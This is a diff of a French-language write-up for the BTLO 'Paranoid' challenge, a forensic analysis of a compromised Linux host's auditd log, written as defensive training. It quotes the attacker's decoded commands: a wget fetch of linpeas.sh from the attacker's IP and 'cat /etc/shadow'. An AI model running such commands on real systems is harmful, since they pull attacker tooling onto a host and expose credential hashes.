@@ -1,246 +1,216 @@
-# 🔐 BTLO — Paranoid | Audit Log Analysis Writeup
+# 🔐 BTLO — Paranoid Writeup
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Challenge-Paranoid-red?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Type-Auditd%20Log%20Analysis-blue?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Difficulty-Hard-orange?style=for-the-badge">
+</p>
+
+---
 
 ## 📋 Scenario
 
-> Analyse d’un fichier `audit.log` provenant d’un système compromis.  
-> L’objectif est d’identifier les actions de l’attaquant, son accès initial, son élévation de privilèges et les données exfiltrées.
+> none
 
-**Fichiers fournis :**
-```
-paranoid.zip/
-└── Challenge Files/
-  └── audit.log
-```
+### 📂 Fichiers fournis
 
-> 💡 Challenge relativement complexe basé sur l’analyse de logs Linux (`auditd`).
+    paranoid.zip/
+    └── Challenge Files/
+        └── audit.log
+
+> ⚠️ PS: celui la etait relativement compliquer  
 
 ---
 
-## 🧠 Méthodologie
-
-Pour analyser le fichier `audit.log`, utilisation de l’outil :
-
-- `aureport` → résumé des événements auditd
-- `grep` → filtrage précis des événements
-- `xxd` → décodage hexadécimal des commandes (`PROCTITLE`)
+## 🧠 Questions
 
 ---
 
-## ❓ Questions & Réponses
+### 🧾 Question 1) What account was compromised?
+
+| Élément | Valeur |
+|--------|--------|
+| Réponse | **btlo** |
+| Outil | `aureport` |
+
+j'ai donc utiliser aureport
+
+    sudo aureport -if audit.log -au
+
+-if,--input <Input File name>	use this file as input  
+-au,--auth			Authentication report  
+
+ce qui ma donner de nombreuse reponse dont 
+
+    89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550
+    90. 10/05/21 02:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes 468442
+
+➡️ j'ai pue deduire dans la collone host : **btlo**
 
 ---
 
-### Q1 — What account was compromised?
+### 💣 Question 2) What attack type was used to gain initial access?
 
-**Réponse : `btlo`**
+| Élément | Valeur |
+|--------|--------|
+| Réponse | **Brute Force** |
 
-Commande utilisée :
+jai donc utiliser aureport 
 
-```bash
-sudo aureport -if audit.log -au
-```
+    aureport -if audit.log  
 
-Options :
-- `-if` → fichier d’entrée
-- `-au` → rapport d’authentification
+ce qui ma donner de nombreuse reponse dont 
 
-Extrait pertinent :
+    Number of failed logins: 87
+    Number of authentications: 3
+    Number of failed authentications: 89
 
-```
-89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550
-90. 10/05/21 02:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes 468442
-```
-
-👉 Le compte compromis est **btlo**
+➡️ jai pue en deduire une attaque par **brutforce**
 
 ---
 
-### Q2 — What attack type was used to gain initial access?
+### 🌐 Question 3) What is the attacker's IP address?
 
-**Réponse : `Brute Force`**
+| Élément | Valeur |
+|--------|--------|
+| Réponse | **192.168.4.155** |
 
-Commande :
+j'ai utiliser le resultat tirer de la commande pour la question 1 
 
-```bash
-aureport -if audit.log
-```
+    sudo aureport -if audit.log -au
 
-Résultats :
+    89. 10/05/21 02:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550
 
-```
-Number of failed logins: 87
-Number of authentications: 3
-Number of failed authentications: 89
-```
-
-👉 Un grand nombre d’échecs indique une attaque **bruteforce**
+➡️ IP attaquant identifiée
 
 ---
 
-### Q3 — What is the attacker's IP address?
+### 🛠️ Question 4) What tool was used to perform system enumeration?
 
-**Réponse : `192.168.4.155`**
+| Élément | Valeur |
+|--------|--------|
+| Réponse | **LinPEAS** |
 
-Toujours avec :
+jai reutiliser un commande utiliser par lattaquant 
 
-```bash
-sudo aureport -if audit.log -au
-```
+    /usr/bin/wget pts1 192.168.4.155 1001 468454
 
-Extrait :
+jai donc repris levent ID : 
 
-```
-10/05/21 02:23:13 btlo 192.168.4.155 ssh
-```
+    grep -A5 "468454" audit.log
 
-👉 IP attaquante identifiée
+ce qui ma sortie le 
 
----
+    proctitle=77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368
 
-### Q4 — What tool was used to perform system enumeration?
+je les decoder avec cette commande 
 
-**Réponse : `LinPEAS`**
+    echo "77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368" | xxd -r -p
 
-Détection via un téléchargement suspect :
+et il ma resortie la commande utiliser en clair 
 
-```
-/usr/bin/wget pts1 192.168.4.155 1001 468454
-```
+    wget -O - http://192.168.4.155:8000/linpeas.sh
 
-Analyse de l’event ID :
-
-```bash
-grep -A5 "468454" audit.log
-```
-
-Résultat :
-
-```
-proctitle=77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368
-```
-
-Décodage :
-
-```bash
-echo "77676574002D4F002D00687474703A2F2F3139322E3136382E342E3135353A383030302F6C696E706561732E7368" | xxd -r -p
-```
-
-Résultat :
-
-```
-wget -O - http://192.168.4.155:8000/linpeas.sh
-```
-
-👉 L’outil utilisé est **LinPEAS**
+➡️ Tool utilisé : **LinPEAS**
 
 ---
 
-### Q5 — What is the name of the binary and pid used to gain root?
+### 🔓 Question 5) What is the name of the binary and pid used to gain root?
 
-**Réponse : `evil,829992`**
+| Élément | Valeur |
+|--------|--------|
+| Réponse | **evil,829992** |
 
-Identification de la session attaquant :
+ses=49 etant la session de l'attaquant jai chercher les les événements sudo réussis avec leur PID 
 
-```
-ses=49
-```
+    grep "ses=49" audit.log | grep "sudo" | grep "res=success"
 
-Recherche des commandes sudo réussies :
+➡️ ce qui ma donner le PID du shell root : **829992**
 
-```bash
-grep "ses=49" audit.log | grep "sudo" | grep "res=success"
-```
+par la suite jai utiliser cette commande : 
 
-👉 PID root : **829992**
+    grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="
 
-Analyse autour de l’événement :
+elle me permet de grep tout ce qui trouve avant levent 481036 et  
 
-```bash
-grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="
-```
+"EXECVE|PROCTITLE|exe=" :  
 
-Résultat :
+- EXECVE : arguments de la commande  
+- PROCTITLE : commande complète  
+- exe= : chemin du binaire  
 
-```
-proctitle=2E2F6576696C0030
-```
+jen ai tirer 
 
-Décodage :
+    proctitle=2E2F6576696C0030
 
-```bash
-echo "2E2F6576696C0030" | xxd -r -p
-```
+et je les decoder avec cette commande 
 
-Résultat :
+    echo "2E2F6576696C0030" | xxd -r -p
 
-```
-./evil0
-```
+ce qui ma donner 
 
-👉 Binaire utilisé : **evil**
+    ./evil0
+
+➡️ proctitle = **./evil0**
 
 ---
 
-### Q6 — What CVE was exploited to gain root access?
+### 🧨 Question 6) What CVE was exploited to gain root access?
 
-**Réponse : `CVE-2021-3156`**
+| Élément | Valeur |
+|--------|--------|
+| Réponse | **CVE-2021-3156** |
 
-Indice trouvé :
+en faisant cette commande 
 
-```
-comm="sudoedit"
-```
+    grep -B5 "481036" audit.log | grep -E "EXECVE|PROCTITLE|exe="
 
-👉 Vulnérabilité connue liée à `sudo`
+jai pue observer 
 
-Recherche → correspond à :
+    comm="sudoedit"
 
-- CVE-2021-3156 (Baron Samedit)
+juste avant le shell root  
 
----
+l'attaquant depuis tout a lheure essaye d'escalader les privilege  
 
-### Q7 — What type of vulnerability is this?
+ce qui ma mener a ce site  
+https://www.sentinelone.com/vulnerability-database/cve-2021-3156/  
 
-**Réponse : `Heap-Based Buffer Overflow`**
-
-👉 Type confirmé par la CVE :
-
-- Dépassement de tampon sur le heap dans `sudo`
+puis je suis allez voir les details sur ce site la  
+https://nvd.nist.gov/vuln/detail/cve-2021-3156  
 
 ---
 
-### Q8 — What file was exfiltrated once root was gained?
+### 🧠 Question 7) What type of vulnerability is this?
 
-**Réponse : `/etc/shadow`**
+| Élément | Valeur |
+|--------|--------|
+| Réponse | **Heap-Based Buffer Overflow** |
 
-Commande utilisée :
+mentionner ici  
+https://nvd.nist.gov/vuln/detail/cve-2021-3156  
 
-```bash
-grep "481063" audit.log | grep "EXECVE"
-```
+---
 
-Résultat :
+### 📤 Question 8) What file was exfiltrated once root was gained?
 
-```
-type=EXECVE msg=audit(...): argc=2 a0="cat" a1="/etc/shadow"
-```
+| Élément | Valeur |
+|--------|--------|
+| Réponse | **/etc/shadow** |
 
-👉 Fichier sensible exfiltré
+    grep "481063" audit.log | grep "EXECVE" 
+
+    type=EXECVE msg=audit(1633393670.675:481063): argc=2 a0="cat" a1="/etc/shadow"
+
+➡️ fichier sensible exfiltré : **/etc/shadow**
 
 ---
 
 ## 🛠️ Outils utilisés
 
 | Outil | Usage |
-|-------|------|
-| `aureport` | Analyse des logs auditd |
-| `grep` | Filtrage des événements |
-| `xxd` | Décodage hexadécimal |
-| `wget` | (attaquant) téléchargement de payload |
-
----
-
-## 📚 Ressources
-
-- https://www.sentinelone.com/vulnerability-database/cve-2021-3156/
-- https://nvd.nist.gov/vuln/detail/cve-2021-3156
+|------|------|
+| aureport | Analyse auditd |
+| grep | Filtrage |
+| xxd | Décodage hex |
+| wget | Téléchargement attaquant |
